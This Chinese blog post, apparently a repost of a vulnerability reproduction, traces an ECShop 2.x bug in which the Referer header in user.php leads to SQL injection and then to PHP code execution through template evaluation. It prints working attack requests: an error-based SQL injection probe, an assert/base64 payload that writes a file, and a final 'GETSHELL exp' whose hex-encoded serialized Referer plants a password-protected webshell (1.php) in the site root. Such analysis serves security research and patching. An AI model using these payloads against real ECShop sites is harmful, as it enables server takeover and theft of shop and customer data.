<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='前言 问题发生在user.php的display函数，模版变量可控，导致注入，配合注入可达到远程代码执行
漏洞分析 0x01-SQL注入 先看user.php
'>
<title>ecshop2.x代码执行</title>

<link rel='canonical' href='https://360rce.github.io/p/vkxkois6/'>

<link rel="stylesheet" href="/scss/style.min.efe1e773d779dbe0d478a3345bc5ad949fed81363c53bfa8984135f20bf7841d.css"><meta property='og:title' content='ecshop2.x代码执行'>
<meta property='og:description' content='前言 问题发生在user.php的display函数，模版变量可控，导致注入，配合注入可达到远程代码执行
漏洞分析 0x01-SQL注入 先看user.php
'>
<meta property='og:url' content='https://360rce.github.io/p/vkxkois6/'>
<meta property='og:site_name' content='iceH&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Ecshop' /><meta property='article:tag' content='漏洞复现' /><meta property='article:published_time' content='2018-09-02T11:42:19&#43;00:00'/><meta property='article:modified_time' content='2018-09-02T11:42:19&#43;00:00'/><meta property='og:image' content='https://w.wallhaven.cc/full/ex/wallhaven-ex277r.png' />
<meta name="twitter:title" content="ecshop2.x代码执行">
<meta name="twitter:description" content="前言 问题发生在user.php的display函数，模版变量可控，导致注入，配合注入可达到远程代码执行
漏洞分析 0x01-SQL注入 先看user.php
"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://w.wallhaven.cc/full/ex/wallhaven-ex277r.png' />
    <link rel="shortcut icon" href="/favicon.ico" />
<style>
    :root {
     
    --sys-font-family: "HarmonyOS_Sans_SC_Medium", Georgia, -apple-system, 'Nimbus Roman No9 L', 'PingFang SC', 'Hiragino Sans GB', 'Noto Serif SC', 'Microsoft Yahei', 'WenQuanYi Micro Hei', 'ST Heiti', sans-serif;
    --code-font-family: "JetBrainsMono Regular", Menlo, Monaco, Consolas, "Courier New";
    --article-font-family: "HarmonyOS_Sans_SC_Medium", var(--base-font-family);
  }
</style>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://npm.elemecdn.com/irithys-cdn@1.0.4/font/font.css";
        customFont.type = "text/css";
        customFont.rel = "stylesheet";
         document.head.appendChild(customFont);
}());
</script>
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended">


        <div id="article-toolbar" style="position: sticky;top: 5px;z-index: 1000;">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>返回</span>
            </a>
        </div>
    

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M512 256C512 397.4 397.4 512 256 512C114.6 512 0 397.4 0 256C0 114.6 114.6 0 256 0C397.4 0 512 114.6 512 256zM176 168V344C176 352.7 180.7 360.7 188.3 364.9C195.8 369.2 205.1 369 212.5 364.5L356.5 276.5C363.6 272.1 368 264.4 368 256C368 247.6 363.6 239.9 356.5 235.5L212.5 147.5C205.1 142.1 195.8 142.8 188.3 147.1C180.7 151.3 176 159.3 176 168V168z"></path></svg>
            
        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#前言">前言</a></li>
    <li><a href="#漏洞分析">漏洞分析</a>
      <ol>
        <li><a href="#0x01-sql注入">0x01-SQL注入</a></li>
        <li><a href="#0x02-代码执行">0x02-代码执行</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/vkxkois6/">
                
                    <img src="https://w.wallhaven.cc/full/ex/wallhaven-ex277r.png" loading="lazy" alt="Featured image of post ecshop2.x代码执行" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E5%90%B9%E6%A2%A6%E5%88%B0%E8%A5%BF%E5%B7%9E/" >
                吹梦到西州
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/vkxkois6/">ecshop2.x代码执行</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M326.1 160l127.4-127.4C451.7 32.39 449.9 32 448 32h-86.06l-128 128H326.1zM166.1 160l128-128H201.9l-128 128H166.1zM497.7 56.19L393.9 160H512V96C512 80.87 506.5 67.15 497.7 56.19zM134.1 32H64C28.65 32 0 60.65 0 96v64h6.062L134.1 32zM0 416c0 35.35 28.65 64 64 64h384c35.35 0 64-28.65 64-64V192H0V416z"></path></svg>
                
                <time class="article-time--published">2018/09/02</time>
            </div>
        

        
            <div>
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M256 512C114.6 512 0 397.4 0 256S114.6 0 256 0S512 114.6 512 256s-114.6 256-256 256zM232 120V256c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2V120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"></path></svg>
                
                <time class="article-time--reading">
                    阅读时长: 1 分钟
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="前言">前言</h2>
<p>问题发生在user.php的display函数，模版变量可控，导致注入，配合注入可达到远程代码执行</p>
<h2 id="漏洞分析">漏洞分析</h2>
<h3 id="0x01-sql注入">0x01-SQL注入</h3>
<p>先看user.php</p>
<p><img src="/p/vkxkois6/01.jpg"
	width="1283"
	height="444"
	srcset="/p/vkxkois6/01_huc92c3150d4afad1a308be1f9c6ba73fa_48005_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/01_huc92c3150d4afad1a308be1f9c6ba73fa_48005_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="288"
		data-flex-basis="693px"
	
></p>
<p>$back_act变量来源于HTTP_REFERER，我们可控。</p>
<p>assign函数用于在模版变量里赋值</p>
<p><img src="/p/vkxkois6/02.jpg"
	width="529"
	height="373"
	srcset="/p/vkxkois6/02_hu73808b97b3c772fcd267ace789e5b89d_15513_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/02_hu73808b97b3c772fcd267ace789e5b89d_15513_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="141"
		data-flex-basis="340px"
	
></p>
<p>再看display函数</p>
<p><img src="/p/vkxkois6/03.jpg"
	width="576"
	height="444"
	srcset="/p/vkxkois6/03_hu94ad3229953116c34d40e15b8731d23e_29136_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/03_hu94ad3229953116c34d40e15b8731d23e_29136_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="129"
		data-flex-basis="311px"
	
></p>
<p><strong>读取user_passport.dwt模版文件内容，显示解析变量后的html内容，用_echash做分割，得到$k然后交给isnert_mod处理，由于_echash是默认的，不是随机生成的，所以$val内容可随意控制。</strong></p>
<p>再看insert_mod函数</p>
<p><img src="/p/vkxkois6/04.jpg"
	width="539"
	height="172"
	srcset="/p/vkxkois6/04_hu663e7aa7ab14f545d8c97ba619076cab_12643_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/04_hu663e7aa7ab14f545d8c97ba619076cab_12643_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="313"
		data-flex-basis="752px"
	
></p>
<p>非常关键的一个地方，这里进行了动态调用</p>
<p>$val传入进来用|分割，参数传入进来时需要被序列化</p>
<p>再看include/lib_insert.php中的insert_ads函数</p>
<p><img src="/p/vkxkois6/05.jpg"
	width="1022"
	height="279"
	srcset="/p/vkxkois6/05_huf52cb46660fa0ee5535bb5f2f8d950a9_37631_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/05_huf52cb46660fa0ee5535bb5f2f8d950a9_37631_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="366"
		data-flex-basis="879px"
	
></p>
<p>可以看到这里直接就能注入了</p>
<p>payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/user.php?act=login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&#34;num&#34;;s:72:&#34;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&#34;;s:2:&#34;id&#34;;i:1;}</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/vkxkois6/06.jpg"
	width="1885"
	height="411"
	srcset="/p/vkxkois6/06_hu6073c48fe64c55b404f97827bfc0ac52_79627_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/06_hu6073c48fe64c55b404f97827bfc0ac52_79627_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="458"
		data-flex-basis="1100px"
	
></p>
<h3 id="0x02-代码执行">0x02-代码执行</h3>
<p><img src="/p/vkxkois6/07.jpg"
	width="536"
	height="138"
	srcset="/p/vkxkois6/07_hufe7806acbd426f830b2a98b7c563378b_12915_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/07_hufe7806acbd426f830b2a98b7c563378b_12915_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="388"
		data-flex-basis="932px"
	
></p>
<p>继续看fetch函数</p>
<p><img src="/p/vkxkois6/08.jpg"
	width="722"
	height="520"
	srcset="/p/vkxkois6/08_hu12c88a0dd96754719f536f16b79418be_39179_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/08_hu12c88a0dd96754719f536f16b79418be_39179_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="138"
		data-flex-basis="333px"
	
></p>
<p>追踪_eval函数</p>
<p><img src="/p/vkxkois6/09.jpg"
	width="374"
	height="159"
	srcset="/p/vkxkois6/09_huef331a609ed0374d55e8b8f05560f451_8130_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/09_huef331a609ed0374d55e8b8f05560f451_8130_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="235"
		data-flex-basis="564px"
	
></p>
<p>$position_style变量来源于数据库中的查询结构</p>
<p><img src="/p/vkxkois6/10.jpg"
	width="742"
	height="222"
	srcset="/p/vkxkois6/10_huea0f487d0c3865cc1d3a90ab3f54df4c_16121_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/10_huea0f487d0c3865cc1d3a90ab3f54df4c_16121_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="334"
		data-flex-basis="802px"
	
></p>
<p>然后我们继续构造SQL注入，因为这段sql操作 order by部分换行了截断不了 所以需要在id处构造注释来配合num进行union查询</p>
<p><img src="/p/vkxkois6/11.jpg"
	width="926"
	height="189"
	srcset="/p/vkxkois6/11_huf5d00fb9781f1fccd7c291f8223389fd_30517_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/11_huf5d00fb9781f1fccd7c291f8223389fd_30517_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="489"
		data-flex-basis="1175px"
	
></p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">ad_id</span><span class="p">,</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">position_id</span><span class="p">,</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">media_type</span><span class="p">,</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">ad_link</span><span class="p">,</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">ad_code</span><span class="p">,</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">ad_name</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">ad_width</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">ad_height</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">position_style</span><span class="p">,</span><span class="w"> </span><span class="n">RAND</span><span class="p">()</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">rnd</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="o">`</span><span class="n">ecshop27</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">ecs_ad</span><span class="o">`</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">LEFT</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="o">`</span><span class="n">ecshop27</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">ecs_ad_position</span><span class="o">`</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">position_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">position_id</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">start_time</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="s1">&#39;1535678679&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">end_time</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="s1">&#39;1535678679&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">position_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="cm">/*&#39; ORDER BY rnd LIMIT */</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">10</span><span class="c1">-- -
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>函数中有一个判断</p>
<p><img src="/p/vkxkois6/12.jpg"
	width="598"
	height="148"
	srcset="/p/vkxkois6/12_hu1b0df71f15554359eee7ba463dcf497d_8480_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/12_hu1b0df71f15554359eee7ba463dcf497d_8480_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="404"
		data-flex-basis="969px"
	
></p>
<p>我们 id传入’/*</p>
<p>num传入*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10– -就能绕过了</p>
<p><img src="/p/vkxkois6/13.jpg"
	width="965"
	height="236"
	srcset="/p/vkxkois6/13_hud69b0fc14fa51411a43f0dcb6094d305_55803_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/13_hud69b0fc14fa51411a43f0dcb6094d305_55803_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="408"
		data-flex-basis="981px"
	
></p>
<p>var_dump一下</p>
<p><img src="/p/vkxkois6/14.jpg"
	width="618"
	height="189"
	srcset="/p/vkxkois6/14_hu9479d5cfe2725fe22efdb8f21fe80964_20840_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/14_hu9479d5cfe2725fe22efdb8f21fe80964_20840_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="326"
		data-flex-basis="784px"
	
></p>
<p><img src="/p/vkxkois6/15.jpg"
	width="935"
	height="289"
	srcset="/p/vkxkois6/15_hud74254c3c952cf64279d29c8b86872d2_63158_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/15_hud74254c3c952cf64279d29c8b86872d2_63158_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="323"
		data-flex-basis="776px"
	
></p>
<p>再看fetch函数,传入的参数被fetch_str函数处理了</p>
<p><img src="/p/vkxkois6/16.jpg"
	width="654"
	height="236"
	srcset="/p/vkxkois6/16_huc0b39a1e1cafd66afc594a99959e61cb_18607_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/16_huc0b39a1e1cafd66afc594a99959e61cb_18607_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="277"
		data-flex-basis="665px"
	
></p>
<p>追踪fetch_str函数，这里的字符串处理流程比较复杂</p>
<p><img src="/p/vkxkois6/17.jpg"
	width="1369"
	height="386"
	srcset="/p/vkxkois6/17_hu955831a958cc500928e150c11a8d55bd_59350_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/17_hu955831a958cc500928e150c11a8d55bd_59350_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="354"
		data-flex-basis="851px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/{([^\}\{</span><span class="se">\n</span><span class="s2">]*)}/e&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\$</span><span class="s2">this-&gt;select(&#39;</span><span class="se">\\</span><span class="s2">1&#39;);&#34;</span><span class="p">,</span> <span class="nv">$source</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这一行意思是比如$source是xxxx{$asd}xxx,那么经过这行代码处理后就是返回this-&gt;select(‘$asd’)的结果</p>
<p>看看select函数</p>
<p><img src="/p/vkxkois6/18.jpg"
	width="832"
	height="416"
	srcset="/p/vkxkois6/18_hu687e6aba0f99aaca0029fcd3d91b2ef3_23475_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/18_hu687e6aba0f99aaca0029fcd3d91b2ef3_23475_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="480px"
	
></p>
<p>第一个字符为$时进入$this-&gt;get_val函数</p>
<p><img src="/p/vkxkois6/19.jpg"
	width="957"
	height="616"
	srcset="/p/vkxkois6/19_hubb5cc5b6b050abbe80ee481f2aa80f18_44239_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/19_hubb5cc5b6b050abbe80ee481f2aa80f18_44239_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="155"
		data-flex-basis="372px"
	
></p>
<p>我们$val没有.$又进入make_var函数</p>
<p><img src="/p/vkxkois6/20.jpg"
	width="782"
	height="565"
	srcset="/p/vkxkois6/20_hud46378023c765e62b0fa09490cf811de_36683_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/20_hud46378023c765e62b0fa09490cf811de_36683_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="138"
		data-flex-basis="332px"
	
></p>
<p>最后这里引入单引号从变量中逃逸</p>
<p><img src="/p/vkxkois6/21.jpg"
	width="956"
	height="266"
	srcset="/p/vkxkois6/21_huc35b153634f427ac3af3d6a658a315d8_57653_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/21_huc35b153634f427ac3af3d6a658a315d8_57653_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="359"
		data-flex-basis="862px"
	
></p>
<p>我们要闭合_var所以最终payload是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="nv">$asd</span><span class="s1">&#39;];assert(base64_decode(&#39;</span><span class="nx">ZmlsZV9wdXRfY29udGVudHMoJzEudHh0JywnZ2V0c2hlbGwnKQ</span><span class="o">==</span><span class="err">&#39;</span><span class="p">));</span><span class="c1">//}xxx
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>会在网站跟目录生成1.txt 里面内容是getshell</p>
<p><img src="/p/vkxkois6/22.jpg"
	width="973"
	height="411"
	srcset="/p/vkxkois6/22_hu2bf2d78b9877217a7976aa990e7e33b8_80695_480x0_resize_q75_box.jpg 480w, /p/vkxkois6/22_hu2bf2d78b9877217a7976aa990e7e33b8_80695_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="ecshop2.x代码执行"
	
	
		class="gallery-image" 
		data-flex-grow="236"
		data-flex-basis="568px"
	
></p>
<p>GETSHELL exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/user.php?act=login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&#34;num&#34;;s:280:&#34;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&#34;;s:2:&#34;id&#34;;s:3:&#34;&#39;/*&#34;;}</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>会在网站根目录生成1.php 密码是1337</p>
<p>文章转载自:
<a class="link" href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"  target="_blank" rel="noopener"
    >http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></p>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/ecshop/">Ecshop</a>
        
            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">相关文章</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/whp5em3l/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/jx/wallhaven-jxd3xw.jpg" loading="lazy" data-key="whp5em3l" data-hash="https://w.wallhaven.cc/full/jx/wallhaven-jxd3xw.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">关于微信内置浏览器 达到持久控制</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/4qx86up5/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/rr/wallhaven-rr629w.png" loading="lazy" data-key="4qx86up5" data-hash="https://w.wallhaven.cc/full/rr/wallhaven-rr629w.png"/>
                
            </div>
        

        <div class="article-details">
